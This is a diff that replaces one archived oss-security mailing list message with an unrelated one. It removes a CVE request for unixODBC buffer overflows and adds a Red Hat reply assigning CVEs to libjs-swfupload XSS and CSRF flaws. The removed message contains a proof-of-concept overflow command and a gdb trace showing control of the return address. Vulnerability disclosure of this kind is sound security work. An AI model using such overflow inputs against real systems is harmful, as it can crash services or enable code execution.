@@ -1,46 +1,64 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/05/29/7
-Message-ID: <CA+5g0S+Gbx7M54nCCKHM067NGi+JRxXrYRdQHs1C+aYsLKH7Ow@mail.gmail.com>
-Date: Tue, 29 May 2012 09:42:42 -0300
-From: Felipe Pena <felipensp@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE id request: Multiple buffer overflow in unixODBC
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/07/17/12
+Message-ID: <5005BFC3.9050607@redhat.com>
+Date: Tue, 17 Jul 2012 13:40:51 -0600
+From: Kurt Seifried <kseifried@...hat.com>
+To: oss-security@...ts.openwall.com, "neal@...lpoole.com >> Neal Poole" <neal@...lpoole.com>
+Subject: Re: CVE id request: libjs-swfupload
 Content-Type: text/plain; charset=utf-8
 
-Hi, please assign a CVE id for the issue:
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-Multiple buffer overflow in unixODBC
-===========================
+On 07/16/2012 01:07 PM, Nico Golde wrote:
+> Hi, * Kurt Seifried <kseifried@...hat.com> [2012-07-16 20:32]:
+>> On 07/16/2012 12:17 PM, Nico Golde wrote:
+>>> Hi, there is an XSS issue in libjs-swfupload. Can we get a CVE
+>>> id for this?
+>>> 
+>>> Details: 
+>>> https://nealpoole.com/blog/2012/05/xss-and-csrf-via-swf-applets-swfupload-plupload/
+>>>
+>>>
+>>
+>>> 
+http://code.google.com/p/swfupload/issues/detail?id=376
+>>> http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=681323
+>>> 
+>> 
+>> There also appears to be a CSRF vulnerability. Is there a reason
+>> for only mentioning the XSS?
+> 
+> The CSRF is for pupload which we don't ship and I haven't looked
+> at.
+> 
+> Cheers Nico
 
-The library unixODBC doesn't check properly the input from FILEDSN=,
-DRIVER= options in the DSN,
-which causes buffer overflow when passed to the SQLDriverConnect() function.
+Please use  CVE-2012-3414 for the libjs-swfupload XSS issue
 
-The unixODBC maintainer has been notified about the issue.
+Please use  CVE-2012-3415 for the libjs-swfupload CSRF issue
 
-Version affected
-============
-
-FILEDSN= as of 2.0.10
-DRIVER= as of 2.3.1
-
-PoC
-===
-
-$ ./poc "FILEDSN=$(python -c "print 'A'*10000")"
-Segmentation fault
-
-(gdb) bt
- #0  0x00007ffff7bc8c81 in SQLReadFileDSN (pszFileName=<value optimized
- out>, pszAppName=<value optimized out>, pszKeyName=<value optimized
- out>,
-    pszString=<value optimized out>, nString=<value optimized out>,
- pnString=<value optimized out>) at SQLReadFileDSN.c:207
- #1  0x4141414141414141 in ?? ()
+- -- 
+Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
 
 
-CREDITS
-=======
 
-This bug was discovered by Felipe Pena.
-BugSec Team - http://www.bugsec.com.br/
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.12 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
+
+iQIcBAEBAgAGBQJQBb/DAAoJEBYNRVNeJnmT674P+weoOJuLNtnOwwiLh2+2KPbZ
+bCJvYWCiCJPfEF3UG73jcomSo8KfooiJIZP9CfBiGLIi4JoLl2ch2g8WdgbVAz9X
+9rG/M+2M/1uWga3MsLoQiKwr9/Rou+BapCrTfWfN/yaUHRe5USoMwv3NL9cWZisz
+ZoJjrcLcoLmHE17rpmqClo/ei24+YSbkrNohpL/UCtOv1egDgIRceVUOeX44M+AA
+x+vyVDVpknSreHv+Q776ydtyrgjoJI0HfxAnAFydLiBb5Lo3KBIHSHZFCzdl1/rg
+kLSjsgxvXLKG5bqDjLG/Fpu9M1AwB0yt7GUTGefCQ8B3agwX1D6mbxYLPvrGW60x
+G0mv9O4Hag7OJeJ/pSAt4x9D8aR+Hhqx51Z4BwOK4hIwWqsBwvQhfTFz+pvwa+/w
+kET7qMEINUa/H2hgTq/zVe/xDtyAwRHZfxvJo9tdyDyaN60LZRi8rxPkUqhDGxcA
+ptw/ftG8k3jQMcm/CT46YtEyjt7xhlD4u6Uos0CcUh3BdNRM1yhqOlP5RfgDzWUi
+eKaJeVibFVHhXgIlzagKD5o/1+FzXhVGWWN/YaUHEEccuESvzpFHLnyn1982PCsv
+oC1yDGmPOs+HyEGuXrZvd8THUvaP+vj80n9jI9JymBDnvt74QFzpxZ8eAA98c6dm
+ZdZxGYuACP+zsN5Tyyb0
+=3Kl2
+-----END PGP SIGNATURE-----
